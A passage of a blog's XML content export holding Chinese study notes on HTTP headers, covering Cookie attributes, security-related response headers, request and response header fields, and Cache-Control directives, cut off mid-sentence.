的有效期（若不明确指定则默认为浏览器关闭前为止） path=PATH 将服务器上的文件目录作为Cookie的适用对象（若不指定则默认为文档所在的文件目录） domain=域名 作为 Cookie 适用对象的域名 （若不指定则默认为创建 Cookie的服务器的域名） Secure 仅在 HTTPS 安全通信时才会发送 Cookie HttpOnly 加以限制，使 Cookie 不能被 JavaScript 脚本访问 expires 属性Cookie 的 expires 属性指定浏览器可发送 Cookie 的有效期。当省略 expires 属性时，其有效期仅限于维持浏览器会话（Session）时间段内。这通常限于浏览器应用程序被关闭之前。 另外，一旦 Cookie 从服务器端发送至客户端，服务器端就不存在可以显式删除 Cookie 的方法。但可通过覆盖已过期的 Cookie，实现对客户端 Cookie 的实质性删除操作。 path 属性Cookie 的 path 属性可用于限制指定 Cookie 的发送范围的文件目录。不过另有办法可避开这项限制，看来对其作为安全机制的效果不能抱有期待。 domain 属性通过 Cookie 的 domain 属性指定的域名可做到与结尾匹配一致。比如，当指定 example.com 后，除 example.com 以外，www.example.com或 www2.example.com 等都可以发送 Cookie。 因此，除了针对具体指定的多个域名发送 Cookie 之 外，不指定domain 属性显得更安全。 secure 属性Cookie 的 secure 属性用于限制 Web 页面仅在 HTTPS 安全连接时，才可以发送 Cookie。 发送 Cookie 时，指定 secure 属性的方法如下所示。 1Set-Cookie: name=value; secure 以上例子仅当在 https://www.example.com/（HTTPS）安全连接的情况下才会进行 Cookie 的回收。也就是说，即使域名相同，http://www.example.com/（HTTP）也不会发生 Cookie 回收行为。当省略 secure 属性时，不论 HTTP 还是 HTTPS，都会对 Cookie 进行回收。 HttpOnly 属性Cookie 的 HttpOnly 属性是 Cookie 的扩展功能，它使 JavaScript 脚本无法获得 Cookie。其主要目的为防止跨站脚本攻击（Cross-sitescripting，XSS）对 Cookie 的信息窃取。发送指定 HttpOnly 属性的 Cookie 的方法如下所示。 1Set-Cookie: name=value; HttpOnly 通过上述设置，通常从 Web 页面内还可以对 Cookie 进行读取操作。但使用 JavaScript 的document.cookie 就无法读取附加 HttpOnly 属性后的 Cookie 的内容了。因此，也就无法在 XSS 中利用 JavaScript 劫持Cookie 了。 虽然是独立的扩展功能，但 Internet Explorer 6 SP1 以上版本等当下的主流浏览器都已经支持该扩展了。另外顺带一提，该扩展并非是为了防止 XSS 而开发的。 Cookie1Cookie: status=enable 首部字段 Cookie 会告知服务器，当客户端想获得 HTTP 状态管理支持时，就会在请求中包含从服务器接收到的 Cookie。接收到多个Cookie 时，同样可以以多个 Cookie 形式发送。 其他首部字段HTTP 首部字段是可以自行扩展的。所以在 Web 服务器和浏览器的应用上，会出现各种非标准的首部字段。 例如： X-Frame-Options X-XSS-Protection DNT P3P X-Frame-Options首部字段 X-Frame-Options 属于 HTTP 响应首部，用于控制网站内容在其他 Web 网站的 Frame 标签内的显示问题。其主要目的是为了防止点击劫持（clickjacking）攻击。 首部字段 X-Frame-Options 有以下两个可指定的字段值。 DENY ：拒绝 SAMEORIGIN ：仅同源域名下的页面（Top-level-browsing-context）匹配时许可。（比如，当指定 http://hackr.jp/sample.html页面为 SAMEORIGIN 时，那么 hackr.jp 上所有页面的 frame 都被允许可加载该页面，而 example.com 等其他域名的页面就不行了） 支持该首部字段的浏览器有：Internet Explorer 8、Firefox 3.6.9+、Chrome 4.1.249.1042+、Safari 4+ 和 Opera 10.50+ 等。现在主流的浏览器都已经支持。能在所有的 Web 服务器端预先设定好 X-Frame-Options 字段值是最理想的状态。 X-XSS-Protection首部字段 X-XSS-Protection 属于 HTTP 响应首部，它是针对跨站脚本攻击（XSS）的一种对策，用于控制浏览器 XSS 防护机制的开关。 首部字段 X-XSS-Protection 可指定的字段值如下。 0 ：将 XSS 过滤设置成无效状态 1 ：将 XSS 过滤设置成有效状态 DNT1DNT: 1 首部字段 DNT 属于 HTTP 请求首部，其中 DNT 是 Do Not Track 的简称，意为拒绝个人信息被收集，是表示拒绝被精准广告追踪的一种方法。 首部字段 DNT 可指定的字段值如下。 0 ：同意被追踪 1 ：拒绝被追踪 由于首部字段 DNT 的功能具备有效性，所以 Web 服务器需要对 DNT做对应的支持。 P3P1P3P: CP="CAO DSP LAW CURa ADMa DEVa TAIa PSAa PSDa IVAa IVDa OUR BUS 首部字段 P3P 属于 HTTP 相应首部，通过利用 P3P（The Platform forPrivacy Preferences，在线隐私偏好平台）技术，可以让 Web 网站上的个人隐私变成一种仅供程序可理解的形式，以达到保护用户隐私的目的。 要进行 P3P 的设定，需按以下操作步骤进行。步骤 1：创建 P3P 隐私步骤 2：创建 P3P 隐私对照文件后，保存命名在 /w3c/p3p.xml步骤 3：从 P3P 隐私中新建 Compact policies 后，输出到 HTTP 响应中 协议中对 X- 前缀的废除在 HTTP 等多种协议中，通过给非标准参数加上前缀 X-，来区别于标准参数，并使那些非标准的参数作为扩展变成可能。但是这种简单粗暴的做法有百害而无一益，因此在“RFC 6648 - Deprecatingthe “X-“ Prefix and Similar Constructs in Application Protocols”中提议停止该做法。然而，对已经在使用中的 X- 前缀来说，不应该要求其变更。 参考链接：https://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出HTTP，从开始到放弃（第六章中）—— HTTP 首部]]></title>
    <url>%2F2018-08-21-read-%E5%9B%BE%E8%A7%A3HTTP-Part6%E4%B8%AD.html</url>
    <content type="text"><![CDATA[公司上个周末出去玩了，所以没有更新，现在又有项目在身上，所以更新的比较慢。 第六章 HTTP 首部（中）请求首部字段请求首部字段是从客户端往服务器端发送请求报文中所使用的字段，用于补充请求的附加消息、客户端消息、对响应内容相关的优先级等内容。 Accept 1Accept: text/html,application/xhtml+xml, application/xml;q=0.9,*/*;q=0 Accept 首部字段可通知服务器，用户代理能够处理的媒体类型及媒体类型的相对优先级。可使用 type/subtype 这种形式，一次指定多种媒体类型。 媒体类型 例子 文本文件 text/html, text/plain, text/cs..application/xhtml+xml, application/xml 图片文件 image/jpeg, image/gif, image/png 视频文件 video/mpeg, video/quicktime 应用程序使用的二进制文件 application/octet-stream, application/zip 比如，如果浏览器不支持 PNG 图片的显示，那 Accept 就不指定 image/png，而指定可处理的 image/gif 和 image/jpeg 等图片类型。 若想要给显示的媒体类型增加优先级，则使用 q= 来额外表示权重值，用分号（;）进行分隔。权重值 q 的范围是 0~1（可精确到小数点后 3 位），且 1 为最大值。不指定权重 q 值时，默认权重为 q=1.0。 当服务器提供多种内容时，将会首先返回权重值最高的媒体类型。 Accept-Charset 1Accept-Charset: iso-8859-5, unicode-1-1;q=0.8 Accept-Charset 首部字段可用来通知服务器用户代理支持的字符集及字符集的相对优先顺序。另外，可一次性指定多种字符集。与首部字段 Accept 相同的是可用权重 q 值来表示相对优先级。 该首字段应用于内容协商机制的服务器驱动协商。 Accept-Encoding 1Accept-Encoding: gzip, deflate Accept-Encoding 首部字段用来告知服务器用户代理支持的内容编码及内容编码的优先级顺序。可一次性指定多种内容编码。 内容编码的例子 内容编码 例子 gzip 由文件压缩程序 gzip（GUN zip）生成的编码格式（RFC1952）,采用 Lempel-Ziv 算法（LZ77）以及 32 位循环冗余校验（Cyclic Redundancy Check，通称 CRC） compress 由 UNIX 文件压缩程序 compress 生成的编码格式，采用 Lempel-Ziv-Welch 算法（LZW） deflate 组合使用 zlib 格式（RFC1950）及由 deflate 压缩算法（RFC1951）生成的编码格式 identity 不执行压缩或不会变化的默认编码格式 采用权重 q 值来表示相对优先级，这点与首部字段 Accept 相同。另外，也可使用星号（*）作为通配符，指定任意的编码格式。 Accept-Language1Accept-Language: zh-cn,zh;q=0.7,en-us,en;q=0.3 首部字段 Accept-Language 用来告知服务器用户代理能够处理的自然语言集（指中文或英文等），以及自然语言集的相对优先级。可一次指定多种自然语言集。和 Accept 首部字段一样，按权重值 q 来表示相对优先级。在上述图例中，客户端在服务器有中文版资源的情况下，会请求其返回中文版对应的响应，没有中文版时，则请求返回英文版响应。 Authorization 1Authorization: Basic dWVub3NlbjpwYXNzd29yZA== 首部字段 Authorization 是用来告知服务器，用户代理的认证信息（证书值）。通常，想要通过服务器认证的用户代理会在接收到返回的401 状态码响应后，把首部字段 Authorization 加入请求中。共用缓存在接收到含有 Authorization 首部字段的请求时的操作处理会略有差异。有关 HTTP 访问认证及 Authorization 首部字段，稍后的章节还会详细说明 Expect 1Expect: 100-continue 客户端使用 Expect 首部字段来告知服务器，期望出现的某些特定行为。因服务器无法理解客户端的期望做出回应而发生错误时，会返回状态码 417 Expection Failed 客户端可以利用该首部字段，写明所期望的扩展。虽然 HTTP/1.1 规范只定义了 100-continue（状态码 100 Continue 之意） 等待状态码 100 响应的客户端在发生请求时，需要指定 Expect:100-continue。 From 首部字段 From 用来告知服务器使用用户代理的用户的电子邮件地址。通常，其使用目的就是为了显示搜索引擎等用户代理的负责人的电子邮件联系方式。使用代理时，应尽可能包含 From 首部字段（但可能会因代理不同，将电子邮件地址记录在 User-Agent 首部字段内）。 Host 图：虚拟主机运行在同一个 IP 上，因此使用首部字段 Host 加以区分 1Host: www.hackr.jp 首部字段 Host 会告知服务器，请求的资源所处的互联网主机名和端口号。Host 首部字段在 HTTP/1.1 规范内是唯一一个必须被包含在请求内的首部字段。首部字段 Host 和以单台服务器分配多个域名的虚拟主机的工作机制有很密切的关联，这是首部字段 Host 必须存在的意义。 请求被发送至服务器时，请求中的主机名会用 IP 地址直接替换解决。但如果这时，相同的 IP 地址下部署运行着多个域名，那么服务器就会无法理解究竟是哪个域名对应的请求。因此，就需要使用首部字段 Host 来明确指出请求的主机名。若服务器未设定主机名，那直接发送一个空值即可。如下所示。 1Host: If-Match 形如 If-xxx 这种样式的请求首部字段，都可称为条件请求。服务器接收到附带条件的请求后，只有判断指定条件为真时，才会执行请求。 图：只有当 If-Match 的字段值跟 ETag 值匹配一致时，服务器才会接受请求 1If-Match: "123456" 首部字段 If-Match，属附带条件之一，它会告知服务器匹配资源所用的实体标记（ETag）值。这时的服务器无法使用弱 ETag 值。（请参照本章有关首部字段 ETag 的说明）服务器会比对 If-Match 的字段值和资源的 ETag 值，仅当两者一致时，才会执行请求。反之，则返回状态码 412 Precondition Failed 的响应。还可以使用星号（*）指定 If-Match 的字段值。针对这种情况，服务器将会忽略 ETag 的值，只要资源存在就处理请求。 If-Modified-Since 图：如果在 If-Modified-Since 字段指定的日期时间后，资源发生了更新，服务器会接受请求 1If-Modified-Since: Thu, 15 Apr 2004 00:00:00 GMT 首部字段 If-Modified-Since，属附带条件之一，它会告知服务器若 If-Modified-Since 字段值早于资源的更新时间，则希望能处理该请求。而在指定 If-Modified-Since 字段值的日期时间之后，如果请求的资源都没有过更新，则返回状态码 304 Not Modified 的响应。If-Modified-Since 用于确认代理或客户端拥有的本地资源的有效性。获取资源的更新日期时间，可通过确认首部字段 Last-Modified 来确定。 If-None-Match 图：只有在 If-None-Match 的字段值与 ETag 值不一致时，可处理该请求。与 If-Match 首部字段的作用相反 首部字段 If-None-Match 属于附带条件之一。它和首部字段 If-Match作用相反。用于指定 If-None-Match 字段值的实体标记（ETag）值与请求资源的 ETag 不一致时，它就告知服务器处理该请求。 在 GET 或 HEAD 方法中使用首部字段 If-None-Match 可获取最新的资源。因此，这与使用首部字段 If-Modified-Since 时有些类似。 If-Range 首部字段 If-Range 属于附带条件之一。它告知服务器若指定的 If-Range 字段值（ETag 值或者时间）和请求资源的 ETag 值或时间相一致时，则作为范围请求处理。反之，则返回全体资源。 下面我们思考一下不使用首部字段 If-Range 发送请求的情况。服务器端的资源如果更新，那客户端持有资源中的一部分也会随之无效，当然，范围请求作为前提是无效的。这时，服务器会暂且以状态码 412Precondition Failed 作为响应返回，其目的是催促客户端再次发送请求。这样一来，与使用首部字段 If-Range 比起来，就需要花费两倍的功夫。 If-Unmodified-Since1If-Unmodified-Since: Thu, 03 Jul 2012 00:00:00 GMT 首部字段 If-Unmodified-Since 和首部字段 If-Modified-Since 的作用相反。它的作用的是告知服务器，指定的请求资源只有在字段值内指定的日期时间之后，未发生更新的情况下，才能处理请求。如果在指定日期时间后发生了更新，则以状态码 412 Precondition Failed 作为响应返回。 Max-Forwards 图：每次转发数值减 1。当数值变 0 时返回响应 通过 TRACE 方法或 OPTIONS 方法，发送包含首部字段 Max-Forwards 的请求时，该字段以十进制整数形式指定可经过的服务器最大数目。服务器在往下一个服务器转发请求之前，Max-Forwards 的值减 1 后重新赋值。当服务器接收到 Max-Forwards 值为 0 的请求时，则不再进行转发，而是直接返回响应。 使用 HTTP 协议通信时，请求可能会经过代理等多台服务器。途中，如果代理服务器由于某些原因导致请求转发失败，客户端也就等不到服务器返回的响应了。对此，我们无从可知。 可以灵活使用首部字段 Max-Forwards，针对以上问题产生的原因展开调查。由于当 Max-Forwards 字段值为 0 时，服务器就会立即返回响应，由此我们至少可以对以那台服务器为终点的传输路径的通信状况有所把握。 Proxy-Authorization1Proxy-Authorization: Basic dGlwOjkpNLAGfFY5 接收到从代理服务器发来的认证质询时，客户端会发送包含首部字段Proxy-Authorization 的请求，以告知服务器认证所需要的信息。这个行为是与客户端和服务器之间的 HTTP 访问认证相类似的，不同之处在于，认证行为发生在客户端与代理之间。客户端与服务器之间的认证，使用首部字段 Authorization 可起到相同作用。有关 HTTP 访问认证，后面的章节会作详尽阐述。 Range1Range: bytes=5001-10000 对于只需获取部分资源的范围请求，包含首部字段 Range 即可告知服务器资源的指定范围。上面的示例表示请求获取从第 5001 字节至第10000 字节的资源。 接收到附带 Range 首部字段请求的服务器，会在处理请求之后返回状态码为 206 Partial Content 的响应。无法处理该范围请求时，则会返回状态码 200 OK 的响应及全部资源。 Referer 1Referer: http://www.hackr.jp/index.htm 首部字段 Referer 会告知服务器请求的原始资源的 URI。 客户端一般都会发送 Referer 首部字段给服务器。但当直接在浏览器的地址栏输入 URI，或出于安全性的考虑时，也可以不发送该首部字段。 因为原始资源的 URI 中的查询字符串可能含有 ID 和密码等保密信息，要是写进 Referer 转发给其他服务器，则有可能导致保密信息的泄露。 另外，Referer 的正确的拼写应该是 Referrer，但不知为何，大家一直沿用这个错误的拼写。 TE1TE: gzip, deflate;q=0.5 首部字段 TE 会告知服务器客户端能够处理响应的传输编码方式及相对优先级。它和首部字段 Accept-Encoding 的功能很相像，但是用于传输编码。 首部字段 TE 除指定传输编码之外，还可以指定伴随 trailer 字段的分块传输编码的方式。应用后者时，只需把 trailers 赋值给该字段值。 1TE: trailers User-Agent1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/201001 首部字段 User-Agent 会将创建请求的浏览器和用户代理名称等信息传达给服务器。由网络爬虫发起请求时，有可能会在字段内添加爬虫作者的电子邮件地址。此外，如果请求经过代理，那么中间也很可能被添加上代理服务器的名称。 响应首部字段响应首部字段是由服务器端向客户端返回响应报文中所使用的字段，用于补充响应的附加消息、服务器消息，以及对客户端的附加要求等消息。 Accept-Ranges1Accept-Ranges: bytes 首部字段 Accept-Ranges 是用来告知客户端服务器是否能处理范围请求，以指定获取服务器端某个部分的资源。 可指定的字段值有两种，可处理范围请求时指定其为 bytes ，反之则指定其为 none。 Age 1Age: 600 首部字段 Age 能告知客户端，源服务器在多久前创建了响应。字段值的单位为秒。 若创建该响应的服务器是缓存服务器，Age 值是指缓存后的响应再次发起认证到认证完成的时间值。代理创建响应时必须加上首部字段 Age。 ETag 1ETag: "82e22293907ce725faf67773957acd12" 首部字段 ETag 告知客户端实体标识。它是一种可将资源以字符串形式做唯一性标识的告知方式。服务器会以没份资源分配对应的 ETag 值。另外，当资源更新时，ETag 值也需要更新。生成 ETag 值时，并没有统一的算法规则，而仅仅是由服务器来分配。 资源被缓存时，就会被分配唯一性标识。例如，当使用中文版的浏览器访问 http://www.google.com/ 时，就会返回中文版对应的资源，而使用英文版的浏览器访问时，则会返回英文版对应的资源。两者的URI 是相同的，所以仅凭 URI 指定缓存的资源是相当困难的。若在下载过程中出现连接中断、再连接的情况，都会依照 ETag 值来指定资源。 强 ETag 值和弱 Tag 值ETag 中有强 ETag 值和弱 ETag 值之分。 强 ETag 值，不论实体发生多么细微的变化都会改变其值。 1ETag: "usagi-1234" 弱 ETag 值，只用于提示资源是否相同。只有当资源发生了根本的变化，产生差异才会改变 ETag 值。这时，会在字段值最开始处附加 W/。 1ETag: W/"usagi-1234" Location 1Location: http://www.usagidesign.jp/sample.html 使用首部字段 Location 可以将响应接收方引导至某个与请求 URI 位置不同的资源。 基本上，该字段会配合 3xx ：Redirection 的响应，提供重定向的URI。 几乎所有的浏览器在接收到包含首部字段 Location 的响应后，都会强制性地尝试对已提示的重定向资源的访问。 Proxy-Authenticate1Proxy-Authenticate: Basic realm="Usagidesign Auth" 首部字段 Proxy-Authenticate 会把由代理服务器所要求的认证信息发送给客户端。 它与客户端和服务器之间的 HTTP 访问认证的行为相似，不同之处在与其认证行为是在客户端与代理之间进行的，而客户端与服务器之间进行认证时，首部字段 WWW-Authorization 有着相同的作用。 Retry-After1Retry-After: 120 首部字段 Retry-After 告知客户端应该在多久之后再次发送请求。主要配合状态码 503 Service Unavailable 响应，或 3xx Redirect 响应一起使用。 字段值可以指定为具体的日期时间（Wed, 04 Jul 2012 06：34：24GMT 等格式），也可以是创建响应后的秒数。 Server 1Server: Apache/2.2.17 (Unix) 首部字段 Server 告知客户端当前服务器上安装的 HTTP 服务器应用程序的信息。不单单会标出服务器上的软件应用名称，还有可能包括版本号和安装时启用的可选项。 1Server: Apache/2.2.6 (Unix) PHP/5.2.5 Vary 图：当代理服务器接收到带有 Vary 首部字段指定获取资源的请求时，如果使用的 Accept-Language 字段的值相同，那么就直接从缓存返回响应。反之，则需要先从源服务器端获取资源后才能作为响应返回 1Vary: Accept-Language 首部字段 Vary 可对缓存进行控制。源服务器会向代理服务器传达关于本地缓存使用方法的命令。 从代理服务器接收到源服务器返回包含 Vary 指定项的响应之后，若再要进行缓存，仅对请求中含有相同 Vary 指定首部字段的请求返回缓存。即使对相同资源发起请求，但由于 Vary 指定的首部字段不相同，因此必须要从源服务器重新获取资源。 WWW-Authenticate1WWW-Authenticate: Basic realm="Usagidesign Auth" 首部字段 WWW-Authenticate 用于 HTTP 访问认证。它会告知客户端适用于访问请求 URI 所指定资源的认证方案（Basic 或是 Digest）和带参数提示的质询（challenge）。状态码 401 Unauthorized 响应中，肯定带有首部字段 WWW-Authenticate。 上述示例中，realm 字段的字符串是为了辨别请求 URI 指定资源所受到的保护策略。有关该首部，请参阅本章之后的内容。 太长了，内容琐碎，看来要再分一小节了，请求首部字段与响应首部字段，耐心看完后是不是有豁然开朗的喜悦(￣▽￣)~* 参考链接：https://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出HTTP，从开始到放弃（第六章上）—— HTTP 首部]]></title>
    <url>%2F2018-08-16-read-%E5%9B%BE%E8%A7%A3HTTP-Part6%E4%B8%8A.html</url>
    <content type="text"><![CDATA[内容太多了，分成两节记录。 第六章 HTTP 首部（上）HTTP协议的请求和响应报文中必定包含HTTP首部，只是我们在使用Web的过程中感受不到它。 HTTP报文首部 HTTP报文协议的请求和响应报文中必定包含HTTP首部。首部内容为客户端和服务器分别处理请求和响应提供所需要的消息。对于客户端用户来说，这些信息中大部分内容都无须亲自查看。 HTTP 请求报文在请求中，HTTP报文由方法、URI、HTTP版本、HTTP首部字段等部分构成。 访问 http://hackr.jp 时，请求报文的首部消息 1234567891011GET / HTTP/1.1Host: hackr.jpUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*; q=0.8Accept-Language: ja,en-us;q=0.7,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Connection: keep-aliveIf-Modified-Since: Fri, 31 Aug 2007 02:02:20 GMTIf-None-Match: "45bae1-16a-46d776ac"Cache-Control: max-age=0 HTTP 响应报文在响应中，HTTP报文由HTTP版本、状态码（数字和原因短语）、HTTP首部字段3部分构成。 请求访问 http://hackr.jp 时，返回的响应报文的首部消息。 12345HTTP/1.1 304 Not ModifiedDate: Thu, 07 Jun 2012 07:21:36 GMTServer: ApacheConnection: closeEtag: "45bae1-16a-46d776ac" HTTP中首部字段同时存在于请求和响应报文内，并涵盖HTTP报文相关的内容消息。 HTTP 首部字段HTTP 首部字段传递重要消息HTTP首部字段是构成HTTP报文的要素之一。在客户端与服务器之间以HTTP协议进行通信的过程中，无论是请求还是响应都会使用首部字段，它能起到额外重要消息的作用。 使用首部字段是为了给浏览器和服务器提供报文主体大小、所使用语言、认证消息等内容。 HTTP 首部字段结构HTTP 首部字段是由首部字段和字段值构成的，中间用冒号“：”分隔 1首部字段名：字段值 例如，在HTTP首部中以 Content-Type 这个字段来表示报文主体的对象类型 1Content-Type: text/html 另外，字段值对应单个HTTP首部字段可以有多个值。 1Keep-Alive: timeout=15, max=100 若HTTP首部字段重复了会如何 当HTTP报文首部中出现了两个或者两个以上具有相同首部字段名时会怎么样？这种情况在规范内还没明确，根据浏览器内部处理逻辑的不同而不同。有些浏览器会优先处理第一次出现的首部字段，有些则反之。 4种 HTTP 首部字段类型HTTP 首部字段根据实际用途被分为以下4种类型 HTTP 首部字段类型 描述 通用首部字段（General Header Fields） 请求报文和响应报文两方都会使用的首部 请求首部字段（Request Header Fields） 从客户端向服务器端发送请求报文时使用的首部。补充了请求的附加内容、客户端消息、响应内容相关优先级等消息 响应首部字段（Response Header Fields） 从服务器端向客户端返回响应报文时使用的首部。补充了响应的附加内容，也要求客户端附加额外的内容消息。 实体首部字段（Entity Header Fields） 针对请求报文和响应报文的实体部分使用的首部。补充了资源内容更新时间等与实体有关的消息。 HTTP/1.1 首部字段一览HTTP/1.1 规范定义了如下47种首部字段 通用首部字段 首部字段名 说明 Cache-Control 控制缓存的行为 Connection 逐跳首部、连接的管理 Date 创建报文的日期时间 Pragma 报文指令 Trailer 报文末端的首部一览 Transfer-Encoding 指定报文主体的传输编码方式 Upgrade 升级为其他协议 Via 代理服务器的相关消息 Warning 错误通知 请求首部字段 首部字段名 说明 Accept 用户代理可处理的媒体类型 Accept-Charset 优先的字符集 Accept-Encoding 优先的内容编码 Accept-Language 优先的语言（自然语言） Authorization Web 认证信息 Expect 期待服务器的特定行为 From 用户的电子邮箱地址 Host 请求资源所在服务器 If-Match 比较实体标记（ETag） If-Modified-Since 比较资源的更新时间 If-None-Match 比较实体标记（与If-Match相反） If-Range 资源未更新时发送实体Byte的范围请求 If-Unmodified-Since 比较资源的更新时间（与If-Modified-Since相反） Max-Forwards 最大传输逐跳数 Proxy-Authorization 代理服务器要求客户端的认证信息 Range 实体的字节范围请求 Referer 对请求中 URI 的原始获取方 TE 传输编码的优先级 User-Agent HTTP 客户端程序的信息 响应首部字段 首部字段名 说明 Accept-Ranges 是否接受字节范围请求 Age 推算资源创建经过的时间 ETag 资源的匹配消息 Location 令客户端重定向至指定的 URI Proxy-Authenticate 代理服务器对客户端的认证消息 Retry-After 对再次发起请求的时机要求 Server HTTP服务器的安装消息 Vary 代理服务器缓存的管理消息 WWW-Authenticate 服务器对客户端的认证消息 实体首部字段 首部字段名 说明 Allow 资源可支持的HTTP方法 Content-Encoding 实体主体适用的编码方式 Content-Language 实体主体的自然语言 Content-Length 实体主体的大小（单位：字节） Content-Location 替换对应资源的 URI Content-MD5 实体主体的报文摘要 Content-Range 实体主体的位置范围 Content-Type 实体主体的媒体类型 Expires 实体主体的过期的日期时间 Last-Modified 资源的最后修改时间 非 HTTP/1.1首部字段在HTTP协议通信交互中使用到的首部字段，不限于RFC2616中定义的47中首部字段。还有Cookie、Set-Cookie和Content-Disposition等在其他RFC中定义的首部字段，它们的使用频率也很高。 这些非正式的首部字段统一归纳在RFC4229HTTP Header Field Registrations中。 End-to-end 首部和Hop-by-hop 首部HTTP首部字段将定义成缓存代理和非缓存代理的行为，分为2种类型。 缓存代理类型 描述 端到端首部（End-to-end） 分在此类别中的首部都会转发给请求/响应对应的最终接收目标，且必须保存在由缓存生成的响应中，另外规定它必须被转发。 逐跳首部（Hop-by-hop-Header） 分在此类别中的首部只对单次转发有效，会通过缓存或代理而不再转发。HTTP/1.1和之后的版本中，如果要使用 hop-by-hop首部，需提供Connection 首部字段。 下面列举了HTTP/1.1中的逐跳首部字段。除了这8个首部字段之外，其他所有字段都属于端到端首部。 Connection Keep-Alive Proxy-Authenticate Proxy-Authorization Trailer TE Transfer-Encoding Upgrade HTTP/1.1 通用首部字段通用首部字段是指，请求报文和响应报文双方都会使用的首部 Cache-Control通过制定首部字段 Cache-control 的指令，就能操作缓存的工作机制。 指令的参数是选的，多个指令之间通过“，”分隔。首部字段 Cache-Control 的指令可用于请求及响应时。 1Cache-Control: private, max-age=0,no-cache 缓存请求指令 指令 参数 说明 no-cache 无 强制向源服务器再次验证 no-store 无 不缓存请求或响应的任何内容 max-age = [秒] 必需 响应的最大Age值 max-stale（=[秒]） 可省略 接收已过期的响应 min-fresh = [秒] 必需 期望在指定时间内的响应仍有效 no-transform 无 代理不可更改媒体类型 noly-if-caches 无 从缓存获取资源 cache-extension - 新指令标记（token） 缓存响应指令 指令 参数 说明 public 无 可向任意方提供响应的缓存 private 可省略 仅向特定用户返回响应 no-cache 可省略 缓存前必须先确认其有效性 no-store 无 不缓存请求或响应任何内容 no-transform 无 代理不可更改媒体类型 must-revalidate 无 可缓存但必须再向源服务器进行确认 proxy-revalidate 无 要求中间缓存服务器对缓存的响应有效性再进行确认 max-age = [秒] 必需 响应的最大Age值 s-maxage=[秒] 必需 公共缓存服务器相应的最大Age值 cache-extension - 新指令标记（token） 表示是否能缓存的指令public 指令1Cache-Control: public 当指定使用 public 的指令时，则明确表明其他用户也可以利用缓存。 private 指令1Cache-control: private 当指定 private 指令后，响应只以特定的用户作为对象，这与 public 指令的行为相反。缓存服务器会对该特定用户提供资源缓存的服务，对于其他用户发送过来的请求，代理服务器则不会返回缓存。 no-cache 指令1Cache-control: no-cache 使用 no-cache 指令的目的是为了防止从缓存中返回过期的资源。 客户端发送的请求中如果包含 no-cache 指令，则表示客户端将不会接收缓存过的响应。于是，“中间”的缓存服务器必须把客户端请求转发给源服务器。 如果源服务器返回的响应中包含 no-cache 的指令，那么缓存服务器不能对资源进行缓存。源服务器以后也将不会对缓存服务器请求中提出的资源有效性进行确认，且禁止其对响应资源进行缓存操作。 1Cache-control: no-cache=Location 由服务器返回的响应中，若报文首部字段 Cache-Control 中对 no-cache 字段名具有指定参数值，那么客户端在接收到这个被指定参数值的首部字段对应的响应报文后，就不能使用缓存。换言之，无参数值的首部字段可以使用缓存，只能在响应指令中指定该参数。 注意：从字面意思上很容易把 no-cache 误解成为不缓存，但事实上 no-cache 代表不缓存过期的资源，缓存会向源服务器进行有效期确认后处理资源，也许称为 do-not-serve-from-cache-without-revalidation 更合适。no-store 才是真正地不进行缓存。 控制可执行缓存的对象指令no-store 指令1Cache-control: no-store 当使用 no-store指令时，暗示请求（和对应的响应）或响应中包含机密信息。因此，该指令规定缓存不能在本地存储请求或响应的任一部分。 指定缓存期限和认证的指令s-maxage 指令1Cache-control: s-maxage = 604800（单位 ：秒） s-maxage 指令的功能和 max-age 指令的相同，它们的不同点是 s-maxage 指令只适用于供多用户使用的公共缓存服务器（代理）。也就是说，对于同一个用户重复返回相应的服务器来说，这个指令是没有任何作用。 另外，当使用 s-maxage 指令后，则直接忽略对 Expires 首部字段及 max-age 指令的处理。 max-age 指令1Cache-control: max-age = 604800（单位 ：秒） 当客户端发送的请求中包含 max-age 指令时，如果判定缓存资源的缓存时间数值比指定时间的数值更小，那么客户端就接受缓存的资源。另外，当指定 max-age 的值为 0，那么缓存服务器通常需要将请求转发给源服务器。 当服务器返回的响应中包含 max-age 指令时，缓存服务器将不对资源的有效性再次确认，而 max-age 数值代表资源保存为缓存的最长时间。 应用 HTTP/1.1 版本的缓存服务器遇到同时存在 Expires 首部字段的情况时，会优先处理 max-age 指令，而忽略掉 Expires 首部字段。而HTTP/1.0 版本的缓存服务器的情况却相反，max-age 指令会被忽略掉。 min-fresh 指令1Cache-Control: min-fresh=60（单位：秒） min-fresh 指令要求缓存服务器返回至少还未过指定时间的缓存资源。比如：当指定了 min-fresh 为 60秒之后，过了60秒的资源都无法作为响应返回了。 max-stale 指令1Cache-Control: max-stale=3600（单位：秒） 使用 max-stale 可指示缓存资源，即使过期也照常接收。如果指令为指定参数值，那么无论经过多久，客户端都会接收响应。如果指令中指定了具体数值，那么即使过期，只要仍然处于 max-stale 指定的时间内，仍旧会被客户端接收。 on-if-cached 指令1Cache-Control: only-if-cached 使用 only-if-cached 指令表示客户端仅在缓存服务器本地缓存目标资源的情况下才会要求其返回。换言之，该指令要求缓存服务器不重新加载响应，也不会再次确认资源有效性。若发生请求缓存服务器的本地缓存无响应，则返回状态码 504 Gateway Timeout。 must-revalidate 指令1Cache-Control: must-revalidate 使用 must-revalidate 指令，代理会向源服务器再次验证即将返回的响应缓存目前是否仍然有效。若代理无法连通源服务器再次获取有效资源的话，缓存必须给客户端一条 504（Gateway Timeout）状态码。另外，使用 must-revalidate 指令会忽略请求的 max-stale 指令（即使已经在首部使用了 max-stale，也不会再有效果）。 proxy-revalidate 指令1Cache-Control: proxy-revalidate proxy-revalidate 指令要求所有的缓存服务器在接收到客户端带有该指令的请求返回响应之前，必须再次验证缓存的有效性。 no-transform 指令1Cache-Control: no-transform 使用 no-transform 指令规定无论是在请求还是响应中，缓存都不能改变实体主体的媒体类型。这样做可防止缓存或代理压缩图片等类似操作。 Cache-Control 扩展cache-extension token1Cache-Control: private, community="UCI" 通过 cache-extension 标记（token），可以扩展 Cache-Control 